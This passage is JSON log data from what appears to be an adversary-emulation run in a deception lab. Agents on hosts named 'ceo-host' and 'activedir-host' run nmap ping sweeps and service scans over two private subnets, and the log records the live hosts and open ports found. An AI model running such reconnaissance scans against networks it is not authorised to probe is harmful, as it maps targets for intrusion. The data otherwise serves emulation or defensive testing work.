host.subnet.online_ipaddrs([])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3'])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.1', '192.168.201.2', '192.168.201.3'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:17:28Z"}, {"deadman": false, "finish": "2023-10-03T20:17:57Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "7e51a4e3-b4f0-4271-86e0-92bc8ef16bda", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "used": [{"trait": "scan.subnet.addr", "links": [], "collected_by": [], "score": 2, "limit_count": -1, "name": "scan.subnet.addr", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.0/24", "unique": "scan.subnet.addr192.168.200.0/24", "created": "2023-10-03T20:17:52Z", "relationships": []}], "unique": "7e51a4e3-b4f0-4271-86e0-92bc8ef16bda", "decide": "2023-10-03T20:17:52Z", "status": 0, "score": 1, "pid": "2862", "relationships": [{"target": {"trait": "host.subnet.online_ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["192.168.200.2", "192.168.200.3", "192.168.200.4", "192.168.200.5", "192.168.200.6", "192.168.200.7"], "unique": "host.subnet.online_ipaddrs['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7']", "created": "2023-10-03T20:17:57Z", "relationships": []}, "source": {"trait": "host.subnet.ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.0/24", "unique": "host.subnet.ipaddrs192.168.200.0/24", "created": "2023-10-03T20:17:57Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_online_ipaddrs", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7207eb880>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7fe7207ebd00>", "score": 1}], "host": "ceo-host", "pin": 0, "paw": "xuyzjc", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmapsubnet", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-03T20:17:54Z", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "facts": [{"trait": "host.subnet.ipaddrs", "links": ["b50f077a-e985-4058-aa9f-c3a1f23ab450", "f3605b9e-b642-4a08-b652-2b4c0e140fe4", "7e51a4e3-b4f0-4271-86e0-92bc8ef16bda", "97784018-c6e6-41fb-9376-7a51cc987e13", "967a21f4-6081-48c4-b87e-fe4a2857c58a"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.0/24", "unique": "host.subnet.ipaddrs192.168.200.0/24", "created": "2023-10-03T20:13:23Z", "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.6', '192.168.200.7', '192.168.200.5'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.3'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])"]}, {"trait": "host.subnet.online_ipaddrs", "links": ["7e51a4e3-b4f0-4271-86e0-92bc8ef16bda"], "collected_by": ["xuyzjc"], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["192.168.200.2", "192.168.200.3", "192.168.200.4", "192.168.200.5", "192.168.200.6", "192.168.200.7"], "unique": "host.subnet.online_ipaddrs['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7']", "created": "2023-10-03T20:17:57Z", "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:17:54Z"}, {"deadman": false, "finish": "2023-10-03T20:18:14Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "b43433c3-093f-4b91-ab70-de1a8aaa55c0", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "used": [{"trait": "scan.subnet.addr", "links": [], "collected_by": [], "score": 2, "limit_count": -1, "name": "scan.subnet.addr", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.0/24", "unique": "scan.subnet.addr192.168.201.0/24", "created": "2023-10-03T20:18:02Z", "relationships": []}], "unique": "b43433c3-093f-4b91-ab70-de1a8aaa55c0", "decide": "2023-10-03T20:18:02Z", "status": 0, "score": 1, "pid": "2865", "relationships": [{"target": {"trait": "host.subnet.online_ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": null, "origin_type": null, "source": null, "value": [], "unique": "host.subnet.online_ipaddrs[]", "created": "2023-10-03T20:18:14Z", "relationships": []}, "source": {"trait": "host.subnet.ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.0/24", "unique": "host.subnet.ipaddrs192.168.201.0/24", "created": "2023-10-03T20:18:14Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_online_ipaddrs", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7207e8880>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7fe7207eb310>", "score": 1}], "host": "ceo-host", "pin": 0, "paw": "xuyzjc", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmapsubnet", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-03T20:18:03Z", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "facts": [{"trait": "host.subnet.ipaddrs", "links": ["7fae9c88-85a3-4f91-8843-22fcf67e7bc9", "b05e5c86-e4e0-4d5a-a972-daed017342e5", "b43433c3-093f-4b91-ab70-de1a8aaa55c0", "8b1f42bd-70cd-4abb-8600-a4c1241cb66d", "8f0da59b-e3d7-4006-85b4-5ae6561c9726"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.0/24", "unique": "host.subnet.ipaddrs192.168.201.0/24", "created": "2023-10-03T20:13:52Z", "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3'])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.1', '192.168.201.2', '192.168.201.3'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:18:03Z"}, {"deadman": false, "finish": "2023-10-03T20:18:30Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "97784018-c6e6-41fb-9376-7a51cc987e13", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "used": [{"trait": "scan.subnet.addr", "links": [], "collected_by": [], "score": 2, "limit_count": -1, "name": "scan.subnet.addr", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.0/24", "unique": "scan.subnet.addr192.168.200.0/24", "created": "2023-10-03T20:18:17Z", "relationships": []}], "unique": "97784018-c6e6-41fb-9376-7a51cc987e13", "decide": "2023-10-03T20:18:17Z", "status": 0, "score": 1, "pid": "9976", "relationships": [{"target": {"trait": "host.subnet.online_ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["192.168.200.1", "192.168.200.2", "192.168.200.4", "192.168.200.5", "192.168.200.6", "192.168.200.7", "192.168.200.3"], "unique": "host.subnet.online_ipaddrs['192.168.200.1', '192.168.200.2', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.3']", "created": "2023-10-03T20:18:30Z", "relationships": []}, "source": {"trait": "host.subnet.ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.0/24", "unique": "host.subnet.ipaddrs192.168.200.0/24", "created": "2023-10-03T20:18:30Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_online_ipaddrs", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7207daec0>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7fe7207da740>", "score": 1}], "host": "activedir-host", "pin": 0, "paw": "sucxhr", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmapsubnet", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-03T20:18:17Z", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "facts": [{"trait": "host.subnet.ipaddrs", "links": ["b50f077a-e985-4058-aa9f-c3a1f23ab450", "f3605b9e-b642-4a08-b652-2b4c0e140fe4", "7e51a4e3-b4f0-4271-86e0-92bc8ef16bda", "97784018-c6e6-41fb-9376-7a51cc987e13", "967a21f4-6081-48c4-b87e-fe4a2857c58a"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.0/24", "unique": "host.subnet.ipaddrs192.168.200.0/24", "created": "2023-10-03T20:13:23Z", "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.6', '192.168.200.7', '192.168.200.5'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.3'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])"]}, {"trait": "host.subnet.online_ipaddrs", "links": ["97784018-c6e6-41fb-9376-7a51cc987e13"], "collected_by": ["sucxhr"], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["192.168.200.1", "192.168.200.2", "192.168.200.4", "192.168.200.5", "192.168.200.6", "192.168.200.7", "192.168.200.3"], "unique": "host.subnet.online_ipaddrs['192.168.200.1', '192.168.200.2', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.3']", "created": "2023-10-03T20:18:30Z", "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.3'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:18:17Z"}, {"deadman": false, "finish": "2023-10-03T20:18:41Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "8b1f42bd-70cd-4abb-8600-a4c1241cb66d", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "used": [{"trait": "scan.subnet.addr", "links": [], "collected_by": [], "score": 2, "limit_count": -1, "name": "scan.subnet.addr", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.0/24", "unique": "scan.subnet.addr192.168.201.0/24", "created": "2023-10-03T20:18:32Z", "relationships": []}], "unique": "8b1f42bd-70cd-4abb-8600-a4c1241cb66d", "decide": "2023-10-03T20:18:32Z", "status": 0, "score": 1, "pid": "10683", "relationships": [{"target": {"trait": "host.subnet.online_ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["192.168.201.3"], "unique": "host.subnet.online_ipaddrs['192.168.201.3']", "created": "2023-10-03T20:18:41Z", "relationships": []}, "source": {"trait": "host.subnet.ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.0/24", "unique": "host.subnet.ipaddrs192.168.201.0/24", "created": "2023-10-03T20:18:41Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_online_ipaddrs", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe72071f8e0>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7fe72071ec80>", "score": 1}], "host": "activedir-host", "pin": 0, "paw": "sucxhr", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmapsubnet", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-03T20:18:32Z", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "facts": [{"trait": "host.subnet.ipaddrs", "links": ["7fae9c88-85a3-4f91-8843-22fcf67e7bc9", "b05e5c86-e4e0-4d5a-a972-daed017342e5", "b43433c3-093f-4b91-ab70-de1a8aaa55c0", "8b1f42bd-70cd-4abb-8600-a4c1241cb66d", "8f0da59b-e3d7-4006-85b4-5ae6561c9726"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.0/24", "unique": "host.subnet.ipaddrs192.168.201.0/24", "created": "2023-10-03T20:13:52Z", "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3'])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.1', '192.168.201.2', '192.168.201.3'])"]}, {"trait": "host.subnet.online_ipaddrs", "links": ["8b1f42bd-70cd-4abb-8600-a4c1241cb66d"], "collected_by": ["sucxhr"], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["192.168.201.3"], "unique": "host.subnet.online_ipaddrs['192.168.201.3']", "created": "2023-10-03T20:18:41Z", "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:18:32Z"}, {"deadman": false, "finish": "2023-10-03T20:19:10Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "69a3fef6-2501-42c2-9644-51cf5f5541bd", "plaintext_command": "nmap -sV --version-light -oX - 192.168.200.1,2,3,4,6,7,5", "used": [{"trait": "scan.remote.addr", "links": [], "collected_by": [], "score": 11, "limit_count": -1, "name": "scan.remote.addr", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.1,2,3,4,6,7,5", "unique": "scan.remote.addr192.168.200.1,2,3,4,6,7,5", "created": "2023-10-03T20:18:42Z", "relationships": []}], "unique": "69a3fef6-2501-42c2-9644-51cf5f5541bd", "decide": "2023-10-03T20:18:42Z", "status": 0, "score": 1, "pid": "13178", "relationships": [{"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-03T20:19:10Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-03T20:19:10Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7207e9f30>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe7207e9d50>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-03T20:19:10Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-03T20:19:10Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7207ea290>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe7207eaad0>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-03T20:19:10Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-03T20:19:10Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7207e9660>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe7207ebb50>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-03T20:19:10Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-03T20:19:10Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7207ea9b0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe7207ea860>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-03T20:19:10Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-03T20:19:10Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7207eb280>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe7207e9b10>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["4444", "krb524"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')]", "created": "2023-10-03T20:19:10Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-03T20:19:10Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7207e87c0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe7207e9bd0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:19:10Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.4", "unique": 